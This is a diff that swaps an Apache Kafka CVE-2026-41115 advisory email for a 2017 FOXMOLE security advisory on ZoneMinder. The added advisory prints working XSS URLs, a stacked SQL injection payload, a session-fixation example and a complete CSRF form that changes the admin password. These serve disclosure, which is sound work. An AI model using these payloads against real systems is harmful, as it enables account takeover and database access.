@@ -1,4 +1,9 @@
-Received: (qmail 27780 invoked by uid 550); 2 Jun 2026 15:28:57 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["5203" "Thursday" "2" "February" "2017" "10:08:30" "+0100" "FOXMOLE Advisories" "advisories@foxmole.com" "<ad74ed31-dcff-24b7-ae84-2421ad10b7ef@foxmole.com>" "130" "[oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues" nil nil nil "2" "2017020209:08:30" "[oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues" (number mark "U       advisories@f Feb  2  130/5203  " thread-indent "\"[oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 32242 invoked by uid 550); 2 Feb 2017 09:45:21 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,50 +12,155 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 17448 invoked from network); 2 Jun 2026 08:04:17 -0000
-Authentication-Results: apache.org; auth=none
-Content-Type: text/plain; charset=utf-8
-From: Luke Chen <showuon@apache.org>
-To: oss-security@lists.openwall.com
-Message-ID: <97818c08-4edd-2460-cd62-71f66bc77f5d@apache.org>
-Content-Transfer-Encoding: quoted-printable
-Date: Tue, 02 Jun 2026 08:02:02 +0000
+Received: (qmail 28616 invoked from network); 2 Feb 2017 09:08:42 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=foxmole.com; h=
+	content-transfer-encoding:content-type:content-type:mime-version
+	:date:date:message-id:subject:subject:from:from; s=20161026; t=
+	1486026511; x=1487840912; bh=7/PoQfu1EIUt1cFTFJIls5cO7mczqLQtM60
+	BlTsknJU=; b=F2Xh29mi6Xrm4cCHGFf2tCCY75xmb8m4Qz39+347fqQZwbrorW4
+	iFmE5hW7MtpgRfSV7h7PKfxCBvuwPSzv9IKbPxNHpepJIBPYBZ410aNdQKGqYtSG
+	gZ+A2Y9j/1komoyNws1QbEcORiIVJMsikZ4bniI5Q0e6XRBlerGyU9sQ6RPxkH0h
+	rQ9RdD+EhILkd5C6636AIDZonGIbdjVuNUavhv7vD3H14r32krQgrb9q57kR2Z55
+	CgeWD/p7PMhQeNeCKMR2YKdSAigaObn/gmtjlkmRvGS2w7rRqpc3CoXYP8aaqF2T
+	7icBah0X5c7jta6vgoOcIxvpp41vW9B6EAQ==
+From: FOXMOLE Advisories <advisories@foxmole.com>
+To: fulldisclosure@seclists.org, bugtraq@securityfocus.com,
+ bugs@securitytracker.com, submissions@packetstormsecurity.org,
+ oss-security@lists.openwall.com
+Message-ID: <ad74ed31-dcff-24b7-ae84-2421ad10b7ef@foxmole.com>
+Date: Thu, 2 Feb 2017 10:08:30 +0100
 MIME-Version: 1.0
-Subject: [oss-security] CVE-2026-41115: Apache Kafka: Improper Authorization in
- CONSUMER_GROUP_DESCRIBE API 
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues
 
-Severity: moderate=20
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA256
 
-Affected versions:
+=== FOXMOLE - Security Advisory 2016-07-05 ===
 
-- Apache Kafka 4.0.0 through 4.3.0
+Zoneminder multiple vulnerabilities
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Description:
+Affected Versions
+=================
+Zoneminder 1.29,1.30
 
-An improper authorization vulnerability has been identified in Apache Kafka.
+Issue Overview
+==============
+Vulnerability Type: SQL Injection, Cross Site Scripting, Session Fixation, No CSRF Protection
+Technical Risk: high
+Likelihood of Exploitation: medium
+Vendor: Zoneminder
+Vendor URL: https://zoneminder.com/
+Credits: FOXMOLE employee Tim Herres
+Advisory URL: https://www.foxmole.com/advisories/foxmole-2016-07-05.txt
+Advisory Status: Public
+CVE-Number: NA
+CVE URL: NA
+OVE-ID:
+OVI-ID:
+CWE-ID: CWE-89
+CVSS 2.0: 4.3 (AV:N/AC:M/Au:N/C:P/I:N/A:N)
 
-The implementation of the CONSUMER_GROUP_DESCRIBE (69) API validates the DE=
-SCRIBE operation on the GROUP resource instead of the READ operation that d=
-ocumented in the official kafka documentation and the KIP-848. This discrep=
-ancy can result in misconfigured Access Control Lists (ACLs) and unintended=
- security postures, like granting READ permission to users who should not b=
-e able to join/sync groups, or allowing users without READ permission (but =
-with DESCRIBE permission) to access sensitive group metadata.
 
-The correct permission for CONSUMER_GROUP_DESCRIBE API is DESCRIBE GROUP so=
- the current implementation is correct. However, the kafka documentation as=
- well as the KIP-848 will be updated to reflect the correct permission. We =
-advise the Kafka users to review existing group ACLs to ensure the principl=
-e of least privilege.
+Impact
+======
+During an internal code review multiple vulnerabilities were identified.
+The whole application misses input validation and output encoding.
+This means user supplied input is inserted in an unsafe way.
+This could allow a remote attacker to easily compromise user accounts or access the database in an unsafe way.
 
-Credit:
+Issue Description
+=================
+The following findings are only examples there are quite more. The whole application should be reviewed.
 
-Luke Chen <showuon@gmail.com> (finder)
+All items tested using Firefox
 
-References:
+1)Cross Site Scripting (XSS)
+Reflected:
+http://192.168.241.131/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke%27%3Chtml%3E%3Chead%3E%3C/head%3E%3Cbody%3E%3Cscript%3Ealert(1)%3C%2fscript%3E%3C/body%3E%3C/html%3Eayn2h
+Reflected without authentication: http://192.168.241.131/zm/index.php/LSE4%22%3E%3Cscript%3Ealert(1)%3C/script%3ELSE
+Stored: Creating a new monitor using the name "Bla<script>alert(1)</script>". There is only a clientside protection.
 
-https://kafka.apache.org/cve-list
-https://kafka.apache.org/
-https://www.cve.org/CVERecord?id=3DCVE-2026-41115
+2)SQL Injection
+Example Url:http://192.168.241.131/zm/index.php
+Parameter: limit (POST)
+    Type: stacked queries
+    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
+    Payload: view=request&request=log&task=query&limit=100;(SELECT *
+FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
+Easy exploitable using sqlmap.
 
+3)Session Fixation
+After a successful authentication the Session Cookie ZMSESSID remains the same.
+Example: Cookie before the login = ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2 after successful login
+ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2
+
+4)No CSRF Proctection
+A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it.
+<html>
+  <body>
+    <form action="http://192.168.241.131/zm/index.php" method="POST">
+      <input type="hidden" name="view" value="user" />
+      <input type="hidden" name="action" value="user" />
+      <input type="hidden" name="uid" value="1" />
+      <input type="hidden" name="newUser&#91;MonitorIds&#93;" value="" />
+      <input type="hidden" name="newUser&#91;Username&#93;" value="admin" />
+      <input type="hidden" name="newUser&#91;Password&#93;"
+value="admin1" />
+      <input type="hidden" name="conf&#95;password" value="admin1" />
+      <input type="hidden" name="newUser&#91;Language&#93;" value="" />
+      <input type="hidden" name="newUser&#91;Enabled&#93;" value="1" />
+      <input type="hidden" name="newUser&#91;Stream&#93;" value="View" />
+      <input type="hidden" name="newUser&#91;Events&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;Control&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;Monitors&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;Groups&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;System&#93;" value="Edit" />
+      <input type="hidden" name="newUser&#91;MaxBandwidth&#93;" value="" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+
+Temporary Workaround and Fix
+============================
+FOXMOLE advises to disable Zoneminder until the vendor publishes a complete fix.
+
+
+
+History
+=======
+2016-07-05  Issue discovered
+2016-11-22  Vendor contacted, no response
+2016-12-16  Vendor contacted again, still no response
+2017-01-17  Vendor contacted --> working on a patch
+2017-01-22  Vendor contacted, asked for an update and
+            declare advisory release to 2017-02-02 --> no response
+2017-02-02  Advisory Release
+
+
+GPG Signature
+=============
+This advisory is signed with the GPG key of the FOXMOLE advisories team.
+The key can be downloaded here: https://www.foxmole.com/advisories-key-3812092199E3277C.asc
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAliS9w0ACgkQOBIJIZnj
+J3yAyhAA0EuT6UjSTVeK5V1nWgmzez9mLTHSfzykzDa+seGUArUjb7dOnqQ6C9O0
+21FKxIOOfBdK+CpuqAk0fm5P5CN9jFLqzTuh7+JLdWA8FDpEQdGIZD3iP6DEAh1q
+4e78ZA30u18imdtDjxBUO+cfgJPLFwIEr+cn7eEiIn+spW9Bd5g1RJEOAZT91feO
+o2rwBz917qRCWKa5I+RqSZj+5Ax4LFiVrvZDgMkihlb4Nvfrpg8ewBQfoATfyqF6
+j0ceZBKjLU3aEq4EE9ZvnbuzVLEraiZ+3xDwXdjF0BRKYS6XgRL2xWgr4ldsQ6sS
+glDyyU8QH8eh5UVAswebx9fKVARmog+34dX/ESJieI7A7s6N05IGpFrRcHPpjhRL
+Y3lNWj5+eSvpRSxf7pb9+KdTd8pZhgKK+MY+GulVIb8xtYYGvdju58Lmu23urV8v
+TuHwMOHsHtOzMRr1C8Z47EdTaUm8GsCqoeO8Z4L6ERg/ZZAuQqES26lLpQtCfMze
+HuGHkGGKVUi5s7BSMQqXiUNc3xipA39b0uqHw9OQpRRUixGl4rvAXTeYx6yBdiib
+tmi3/Oph6kWQjuFFhiFC8zrjJhmEtOLc4O+BweKx/WfgWQQ8JPCsznpD2J3ln8XD
+0lP0yuSO0CaJptLioYJhPr+m2SmGxY4rxSuu1cdrOJZfv9QkiLw=
+=/QtX
+-----END PGP SIGNATURE-----
